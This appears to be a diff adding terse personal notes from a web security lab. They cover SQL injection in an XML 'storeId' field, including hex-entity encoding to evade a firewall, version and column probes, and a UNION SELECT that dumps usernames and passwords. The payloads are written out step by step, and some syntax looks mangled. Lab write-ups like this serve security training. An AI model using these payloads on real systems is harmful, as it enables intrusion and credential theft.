@@ -1,0 +1,22 @@
+SQLi with filter bypass via XML encoding
+
+here there is a user filter where it lets you select a city from a drop down to know the available items in that city. 
+and as you intercept the request, you can see that it is sent through xml so do
+  <storeId>3-1 or sth do this to know it evaluates it and it does so add your sql beside it like 
+</storeId>
+
+<storeId>3-1 union select null here you can see that it doesnt work and it was detected as attack
+</storeId> so right click, hackverter,hex entities, and you'll get
+
+<@hex_entities>
+<storeId>
+3-1 UNION SELECT null</@hex_entities> now its not labeled as attack
+  </storeId>
+<@hex_entities>
+
+3-1 UNION select @@version (doesnt work) but 1 union select version() work because it uses postgresql db
+
+
+next up, add the payload to check the amount of columns using the null check, you an see that it has only 1 column.
+so concatenate using the pipe method like
+3-1 UNION SELECT username  '~'  password from users  with in the hex thing and it works
